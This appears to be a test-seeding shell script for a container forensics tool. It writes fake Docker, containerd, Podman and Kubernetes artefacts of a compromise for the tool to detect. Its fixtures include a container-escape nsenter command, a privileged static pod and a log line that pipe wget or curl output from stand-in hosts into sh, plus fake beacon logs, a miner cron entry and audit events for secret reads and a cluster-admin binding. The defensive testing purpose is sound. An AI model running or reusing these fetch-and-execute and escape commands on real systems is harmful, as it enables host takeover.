#!/bin/sh
# Plant a Docker host's and a Kubernetes node's on-disk state, as Gandalf collects it, without
# running either: an escape-capable container (privileged, the Docker socket and / mounted,
# the host's PID namespace) whose writable layer holds a dropped binary and a cron entry, a
# static pod nobody should have put there, a pod log and an API server audit log with secrets
# read, an exec and a cluster-admin binding. containerd's metadata (containerd/meta.db, made by
# containerd itself: see make-meta-db.sh there) adds a privileged ctr container with / mounted,
# and Podman's (podman/db.sql, likewise) a privileged one and one with Podman's API socket. Nothing here runs; the "binary" is text behind an
# ELF header. Called by seed-artefacts.sh, whose expected.json lists what Elrond should find.
set -eu

ROOT=${ROOT:-}  # tests seed a temporary directory instead of /
CID=4f1c9e2ab3d7c0de5eedfacade1b0b0c4f1c9e2ab3d7c0de5eedfacade1b0b0c
DOCKER=$ROOT/var/lib/docker
mkdir -p "$DOCKER/containers/$CID" "$DOCKER/image/overlay2/layerdb/mounts/$CID" \
  "$DOCKER/overlay2/labmount/diff/tmp/.x" "$DOCKER/overlay2/labmount/diff/etc/cron.d" \
  "$ROOT/etc/kubernetes/manifests" "$ROOT/var/log/pods/payments_api-7d9f_0b1c/api" "$ROOT/var/log/kubernetes/audit"

# T1611 / T1610: the container's configuration
cat > "$DOCKER/containers/$CID/config.v2.json" <<EOF
{"ID": "$CID", "Name": "/lab-helper", "Created": "2026-10-20T09:00:00Z",
 "Path": "/bin/sh", "Args": ["-c", "nsenter -t 1 -m -u -i -n sh"],
 "State": {"Running": true, "StartedAt": "2026-10-20T09:00:01Z", "FinishedAt": "0001-01-01T00:00:00Z"},
 "Config": {"Image": "docker.io/library/alpine:3.20", "User": ""},
 "MountPoints": {"/host": {"Source": "/", "Destination": "/host", "RW": true}}}
EOF
cat > "$DOCKER/containers/$CID/hostconfig.json" <<'EOF'
{"Privileged": true, "PidMode": "host", "NetworkMode": "bridge", "CapAdd": ["SYS_ADMIN"],
 "Binds": ["/var/run/docker.sock:/var/run/docker.sock"], "SecurityOpt": ["seccomp=unconfined"]}
EOF
printf '%s\n' \
  '{"log":"resolving c2.rivendell-lab.test\n","stream":"stdout","time":"2026-10-20T09:00:02.000000000Z"}' \
  '{"log":"beacon sent to 198.51.100.23:8080\n","stream":"stdout","time":"2026-10-20T09:00:03.000000000Z"}' \
  > "$DOCKER/containers/$CID/$CID-json.log"

# T1611 / T1610: containerd's own record of its containers (no Docker involved)
mkdir -p "$ROOT/var/lib/containerd/io.containerd.metadata.v1.bolt"
cp "$(dirname "$0")/containerd/meta.db" "$ROOT/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db"

# T1611 / T1610: Podman's state database (SQLite, as Podman 4.8 on keeps it)
mkdir -p "$ROOT/var/lib/containers/storage"
cp "$(dirname "$0")/podman/db.sql" "$ROOT/var/lib/containers/storage/db.sql"

# T1105 / T1053.003: what changed in the container since its image
echo labmount > "$DOCKER/image/overlay2/layerdb/mounts/$CID/mount-id"
printf '\177ELF lab placeholder: not a real binary\n' > "$DOCKER/overlay2/labmount/diff/tmp/.x/lab-miner"
chmod 0755 "$DOCKER/overlay2/labmount/diff/tmp/.x/lab-miner"
echo '* * * * * root /tmp/.x/lab-miner' > "$DOCKER/overlay2/labmount/diff/etc/cron.d/lab-miner"

# T1543.005 / T1611: a static pod the kubelet would run with no API server involved
cat > "$ROOT/etc/kubernetes/manifests/lab-node-agent.yaml" <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: lab-node-agent
  namespace: kube-system
spec:
  hostPID: true
  containers:
  - name: agent
    image: docker.io/library/busybox:1.36
    command: ["sh", "-c", "wget -qO- http://update.rivendell-lab.test/agent | sh"]
    securityContext:
      privileged: true
  volumes:
  - name: root
    hostPath:
      path: /
EOF

# A pod's output in the kubelet's CRI log format
echo '2026-10-20T09:05:00.000000000Z stderr F curl http://198.51.100.23:8080/beacon | sh' \
  > "$ROOT/var/log/pods/payments_api-7d9f_0b1c/api/0.log"

# T1552.007 / T1609 / T1098.006: the API server's audit log
audit() {  # index user verb resource subresource namespace [requestObject]
  printf '{"apiVersion":"audit.k8s.io/v1","kind":"Event","auditID":"lab-%s","stage":"ResponseComplete","requestReceivedTimestamp":"2026-10-20T09:1%s:00Z","user":{"username":"%s","groups":["system:authenticated"]},"sourceIPs":["198.51.100.77"],"userAgent":"kubectl/v1.31.0","verb":"%s","objectRef":{"resource":"%s","subresource":"%s","namespace":"%s","name":"lab"},"responseStatus":{"code":200}%s}\n' \
    "$1" "$1" "$2" "$3" "$4" "$5" "$6" "${7:-}"
}
{
  audit 0 system:serviceaccount:kube-system:replicaset-controller create pods "" default
  audit 1 lab-intruder list secrets "" payments
  audit 2 lab-intruder create pods exec payments
  audit 3 lab-intruder create clusterrolebindings "" "" ',"requestObject":{"roleRef":{"name":"cluster-admin"}}'
} > "$ROOT/var/log/kubernetes/audit/audit.log"
